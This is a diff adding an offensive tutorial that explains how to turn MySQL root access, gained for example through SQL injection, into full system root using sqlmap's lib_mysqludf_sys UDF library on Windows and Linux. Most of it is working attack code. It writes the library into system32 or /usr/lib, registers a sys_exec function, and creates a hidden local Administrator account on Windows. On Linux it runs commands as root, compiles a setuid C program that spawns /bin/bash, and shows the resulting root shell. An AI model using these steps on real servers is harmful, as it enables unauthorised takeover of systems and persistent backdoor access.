@@ -1,0 +1,110 @@
+MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux
+
+Once a MySQL database server has been compromised at root level, it’s often possible to escalate this access to full system level access using User Defined Functions (UDFs). We may have MySQL root access but not system root access for a number of reasons including having a shell account on the target whilst MySQL’s root user has been left unpassworded by default, or alternatively gaining access via SQL injection through a web application connecting to the database as root, which is something I see far too often.
+
+Firstly, you’ll want to check out a copy of sqlmap. For this attack you’ll want to browse to the ‘udf’ directory and select the appropriate library depending on your target platform:
+
+    udf/mysql/linux/32/lib_mysqludf_sys.so
+    udf/mysql/linux/64/lib_mysqludf_sys.so
+    udf/mysql/windows/32/lib_mysqludf_sys.dll
+    udf/mysql/windows/64/lib_mysqludf_sys.dll
+
+The steps for escalation on both Windows and Linux are the same. Firstly, we need to get a copy of the correct library on to the target machine in a known location – this could be by uploading to a user account we have access to, or uploading via a website image/file upload, or anonymous FTP account. The second step is issuing a SQL query to load this file in to a newly created table row.
+
+Third, we then want to dump that table row out to a new file in either the ‘/usr/lib’ directory or the ‘c:\windows\system32’ directory depending on whether we are on Linux or Windows respectively. The reason we need to do this, is that our regular web application or user account does not have permission to create files in these directories, however the MySQL root user does. Next, we want to instruct MySQL to create a new function to point to the code in our malicious library. Lastly, we execute this new function with arbitrary system commands that we wish to run.
+
+MySQL on Windows Escalation
+
+On windows, the process is as follows:
+1
+2
+3
+4
+5
+6
+7
+	
+USE mysql;
+CREATE TABLE npn(line blob);
+INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll'));
+SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll';
+CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
+SELECT sys_exec("net user npn npn12345678 /add");
+SELECT sys_exec("net localgroup Administrators npn /add");
+Windows lib_mysqludf_sys
+
+Windows lib_mysqludf_sys
+
+MySQL on Linux Escalation
+
+On Linux, the process is really much the same, assuming we’re logged in as user ‘npn’:
+1
+2
+3
+4
+5
+6
+	
+* mysql> use mysql;
+* mysql> create table npn(line blob);
+* mysql> insert into npn values(load_file('/home/npn/lib_mysqludf_sys.so'));
+* mysql> select * from npn into dumpfile '/usr/lib/lib_mysqludf_sys.so';
+* mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so';
+* mysql> select sys_exec('id > /tmp/out; chown npn.npn /tmp/out');
+
+Now from our shell, we can cat /tmp/out:
+1
+2
+	
+* npn@pwn:~$ cat /tmp/out
+* uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm)
+
+We can confirm that the commands we ran were executed as root. 
+The easiest thing to do now is for user ‘npn’ to create and compile a 
+simple setuid/system program under C:
+1
+2
+3
+4
+5
+6
+7
+	
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system(“/bin/bash”);
+}
+
+We can compile this and place it in /tmp/ with:
+1
+	
+gcc -o /tmp/shell /home/npn/shell.c
+
+Finally, we can use our MySQL root account to set the setuid bit on the binary:
+1
+	
+* mysql> select sys_exec('chmod +s /tmp/shell');
+
+User ‘npn’ can then execute /tmp/shell to gain a root shell
+1
+2
+3
+4
+5
+6
+7
+8
+9
+	
+npn@pwn:~$ /tmp/shell
+root@pwn:/home/npn# cd ~/
+root@pwn:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@pwn:~# ps
+PID TTY TIME CMD
+1919 pts/1 00:00:00 bash
+2058 pts/1 00:00:00 ps
+root@pwn:~#
